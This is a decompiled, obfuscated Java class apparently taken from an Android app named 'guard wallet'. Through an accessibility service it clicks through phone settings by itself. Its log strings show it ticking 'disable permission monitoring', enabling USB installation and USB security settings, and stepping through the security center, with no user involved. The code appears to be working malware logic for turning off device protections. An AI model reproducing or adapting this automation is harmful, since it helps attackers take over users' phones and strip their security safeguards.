package o;

import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

// $VF: synthetic class
public final class j implements Runnable {
   public final int a;
   public final k b;

   @Override
   public final void run() {
      int var2 = this.a;
      boolean var5 = true;
      int var1 = 10;
      k var10 = this.b;
      switch (var2) {
         case 0:
            label253: {
               boolean var22;
               label252: {
                  var10.getClass();
                  if (a0.t0()) {
                     if (com.guard.wallet.utils.e.i()) {
                        AtomicInteger var11 = new AtomicInteger(0);

                        while (true) {
                           UiObject var24 = var10.L();
                           UiObject var8 = var24;
                           if (var24 != null) {
                              var8 = var24;
                              if (var24.canScrollForward()) {
                                 var24.scrollForwardEnd();
                                 var10.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                 com.guard.wallet.utils.g.T0(5);
                                 var8 = var10.L();
                              }
                           }

                           Object var9 = null;
                           if (var8 != null) {
                              UiObject var36;
                              if (var8.canScrollBackward()) {
                                 var36 = var8.scrollBackwardUtil(a0.F0());
                              } else {
                                 var36 = null;
                              }

                              var24 = var36;
                              if (var36 == null) {
                                 var24 = var36;
                                 if (var8.canScrollForward()) {
                                    var24 = var8.scrollForwardUtil(a0.F0());
                                 }
                              }
                           } else {
                              var24 = null;
                           }

                           if (var24 != null && var24.parent() != null) {
                              UiObject var37 = var24.parent();
                              AtomicInteger var13 = new AtomicInteger(0);
                              CheckedResult var41 = new CheckedResult();
                              CombineFilter var12 = a0.Q0();
                              MyAccessibilityService.I(var37);

                              for (var24 = (UiObject)var9; var37 != null && var24 == null && var13.incrementAndGet() <= 3; var37 = var37.parent()) {
                                 var24 = var37.findOneByCombine(var12);
                              }

                              boolean var23;
                              if (var24 != null) {
                                 var22 = var24.checked();
                                 if (!var22 && var24.click()) {
                                    var41.setClicked(true);
                                    var24.refresh();
                                    var23 = var24.checked();
                                    var1 = 20;

                                    while (true) {
                                       var22 = var23;
                                       var2 = var1;
                                       if (var1 <= 0) {
                                          break;
                                       }

                                       var22 = var23;
                                       var2 = var1;
                                       if (var23) {
                                          break;
                                       }

                                       com.guard.wallet.utils.g.T0(1);
                                       var24.refresh();
                                       var23 = var24.checked();
                                       var1--;
                                    }
                                 } else {
                                    var2 = 20;
                                 }

                                 var23 = var22;
                                 if (!var22) {
                                    var37 = var24.findParentUtilCombine(a0.T());
                                    var23 = var22;
                                    if (var37 != null) {
                                       var23 = var22;
                                       if (var37.click()) {
                                          var41.setClicked(true);
                                          var24.refresh();
                                          var22 = var24.checked();

                                          while (true) {
                                             var23 = var22;
                                             if (var2 <= 0) {
                                                break;
                                             }

                                             var23 = var22;
                                             if (var22) {
                                                break;
                                             }

                                             com.guard.wallet.utils.g.T0(1);
                                             var24.refresh();
                                             var22 = var24.checked();
                                             var2--;
                                          }
                                       }
                                    }
                                 }
                              } else {
                                 var23 = false;
                              }

                              var41.setChecked(var23);
                              if (var41.isChecked()) {
                                 var10.p = true;
                                 Log.d("EnableSecureDelegate", "禁用权限监控已勾选");
                              }
                           }

                           if (var10.p || var11.incrementAndGet() > 10) {
                              var10.I(var10.p);
                              break;
                           }

                           com.guard.wallet.utils.g.T0(10);
                        }
                     }

                     if (!com.guard.wallet.utils.e.m()) {
                        break label253;
                     }

                     AtomicInteger var42 = new AtomicInteger(0);

                     label192:
                     while (true) {
                        UiObject var45 = var10.L();
                        if (var45 != null) {
                           z.d var43 = new z.d(a0.R0(), 2, 0);
                           UiObject var39 = var45.scrollForwardUtil(var43);
                           UiObject var27 = var39;
                           if (var39 == null) {
                              var45.scrollBackwardEnd();
                              var10.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                              com.guard.wallet.utils.g.T0(5);
                              var45 = var10.L();
                              var27 = var39;
                              if (var45 != null) {
                                 var27 = var45.scrollForwardUtil(var43);
                              }
                           }

                           label188: {
                              if (var27 != null) {
                                 var27 = var27.findParentUtilCombine(a0.q0());
                                 if (var27 != null) {
                                    CheckedResult var29 = var10.K(var27, 20);
                                    var10.q = var29.isChecked();
                                    var22 = var29.isClicked();
                                    break label188;
                                 }
                              }

                              var22 = false;
                           }

                           if (var22) {
                              Log.d("EnableSecureDelegate", "USB安装已点击");
                           }

                           if (var10.q) {
                              Log.d("EnableSecureDelegate", "USB安装已勾选");
                           }
                        }

                        if (var10.q || var42.incrementAndGet() > 10) {
                           var42.set(0);

                           while (true) {
                              var45 = var10.L();
                              if (var45 != null) {
                                 z.d var44 = new z.d(a0.S0(), 3, 0);
                                 UiObject var40 = var45.scrollForwardUtil(var44);
                                 UiObject var30 = var40;
                                 if (var40 == null) {
                                    var45.scrollBackwardEnd();
                                    var10.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                    com.guard.wallet.utils.g.T0(5);
                                    var45 = var10.L();
                                    var30 = var40;
                                    if (var45 != null) {
                                       var30 = var45.scrollForwardUtil(var44);
                                    }
                                 }

                                 label162: {
                                    if (var30 != null) {
                                       var30 = var30.findParentUtilCombine(a0.q0());
                                       if (var30 != null) {
                                          com.guard.wallet.utils.g.T0(5);
                                          CheckedResult var32 = var10.K(var30, 0);
                                          var10.r = var32.isChecked();
                                          var22 = var32.isClicked();
                                          break label162;
                                       }
                                    }

                                    var22 = false;
                                 }

                                 if (var10.r) {
                                    Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                 }

                                 if (var22) {
                                    AtomicInteger var33 = new AtomicInteger(10);

                                    while (true) {
                                       var22 = var10.H();
                                       if (var22 || var33.decrementAndGet() < 0) {
                                          if (var22) {
                                             Log.d("EnableSecureDelegate", "USB安全设置点击成功,已弹出安全设置窗口");
                                          }
                                          break;
                                       }

                                       com.guard.wallet.utils.g.T0(1);
                                    }
                                 }
                              }

                              AtomicInteger var34 = new AtomicInteger(10);

                              while (true) {
                                 var22 = var10.H();
                                 if (var22 || var34.decrementAndGet() < 0) {
                                    if (var10.r || var22 || var42.incrementAndGet() > 10) {
                                       if (!var10.r) {
                                          break label253;
                                       }

                                       Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                       if (var10.q && var10.r) {
                                          var22 = var5;
                                          break label252;
                                       }
                                       break label192;
                                    }

                                    com.guard.wallet.utils.g.T0(10);
                                    break;
                                 }

                                 com.guard.wallet.utils.g.T0(1);
                              }
                           }
                        }

                        com.guard.wallet.utils.g.T0(10);
                     }
                  }

                  var22 = false;
               }

               var10.I(var22);
            }

            var10.o.remove("enableInPrepareFinish");
            return;
         default:
            Log.d("EnableSecureDelegate", "enableInSecurityCenter 窗口匹配");
            UiObject var7 = var10.k().findOneByCombine(a0.K0());
            ConcurrentLinkedQueue var6 = var10.o;
            if (var7 != null && var7.clickable() && var7.click()) {
               Log.d("EnableSecureDelegate", "enableInSecurityCenter 下一步");
            } else {
               var7 = var10.k().findOneByCombine(a0.J0());
               if (var7 != null && var7.clickable() && var7.click()) {
                  while (true) {
                     com.guard.wallet.utils.g.T0(var1);
                     boolean var14;
                     if (var10.k() != null && var10.k().findOneByCombine(a0.L0()) != null) {
                        var14 = true;
                     } else {
                        var14 = false;
                     }

                     if (!var14) {
                        var10.r = true;
                        var10.I(var10.q);
                        break;
                     }

                     Log.d("EnableSecureDelegate", "正在开启USB安全设置....");
                     var1 = 5;
                  }
               }
            }

            var6.remove("enableInSecurityCenter");
      }
   }
}
